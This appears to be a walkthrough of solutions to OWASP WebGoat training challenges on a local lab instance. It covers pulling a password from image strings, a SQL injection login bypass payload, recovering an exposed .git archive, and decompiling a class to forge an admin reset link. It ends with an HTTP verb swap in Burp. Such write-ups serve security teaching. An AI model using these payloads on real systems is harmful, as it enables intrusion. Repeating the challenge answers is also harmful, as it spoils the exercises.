# Admin lost password
1. Download image from the website.
2. $ strings logo.png
3. in the output find:

admin:!!webgoat_admin_7753!!

# Without password
1. Simple SQL Injection
2. type in password: 'OR 1=1;--

# Admin password reset
1. Check here: https://github.com/WebGoat/WebGoat/blob/develop/src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java
2. find that there is 

@GetMapping(value = "/challenge/7/.git", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
@ResponseBody
public ClassPathResource git() {
	return new ClassPathResource("challenge7/git.zip");
}

3. download git.zip from http://localhost:8080/WebGoat/challenge/7/.git
4. open directory
5. $ git log
6. $ git restore *
7. decompile PasswordResetLink.class on http://www.javadecompilers.com/

import java.util.Random;

// 
// Decompiled by Procyon v0.5.36
// 

public class PasswordResetLink
{
    public String createPasswordReset(final String s, final String s2) {
        final Random random = new Random();
        if (s.equalsIgnoreCase("admin")) {
            random.setSeed(s2.length());
        }
        return scramble(random, scramble(random, scramble(random, MD5.getHashString(s))));
    }
    
    public static String scramble(final Random random, final String s) {
        final char[] charArray = s.toCharArray();
        for (int i = 0; i < charArray.length; ++i) {
            final int nextInt = random.nextInt(charArray.length);
            final char c = charArray[i];
            charArray[i] = charArray[nextInt];
            charArray[nextInt] = c;
        }
        return new String(charArray);
    }
    
    public static void main(final String[] array) {
        if (array == null || array.length != 2) {
            System.out.println("Need a username and key");
            System.exit(1);
        }
        final String str = array[0];
        final String s = array[1];
        System.out.println("Generation password reset link for " + str);
        System.out.println("Created password reset link: " + new PasswordResetLink().createPasswordReset(str, s));
    }
}

8. So we will need username (admin) and key (?)
9. $ git diff f9400 ac937c -> shows taht there is a change in bin PasswordResetLink
10. decompile this version of the PasswordResetLink bin

/* Decompiler 5ms, total 161ms, lines 38 */
import java.util.Random;

public class PasswordResetLink {
   public String createPasswordReset(String var1, String var2) {
      Random var3 = new Random();
      if (var1.equalsIgnoreCase("admin")) {
         var3.setSeed((long)var2.length());
      }

      return scramble(var3, scramble(var3, scramble(var3, MD5.getHashString(var1))));
   }

   public static String scramble(Random var0, String var1) {
      char[] var2 = var1.toCharArray();

      for(int var3 = 0; var3 < var2.length; ++var3) {
         int var4 = var0.nextInt(var2.length);
         char var5 = var2[var3];
         var2[var3] = var2[var4];
         var2[var4] = var5;
      }

      return new String(var2);
   }

   public static void main(String[] var0) {
      if (var0 == null || var0.length != 1) {
         System.out.println("Need a username");
         System.exit(1);
      }

      String var1 = var0[0];
      String var2 = "!!keykeykey!!";
      System.out.println("Generation password reset link for " + var1);
      System.out.println("Created password reset link: " + (new PasswordResetLink()).createPasswordReset(var1, var2));
   }
}

11. here we have password (!!keykeykey!!)
12. then $ java PasswordResetLink admin -> 375afe1104f4a487a73823c50a9292a2
13. type: gabriel@webgoat.com in reset field
14. open WebWolf
15. see reset link, click it
16. replace url with 375afe1104f4a487a73823c50a9292a2 
    
# Without account
1. open Burp
2. replace GET in request with HEAD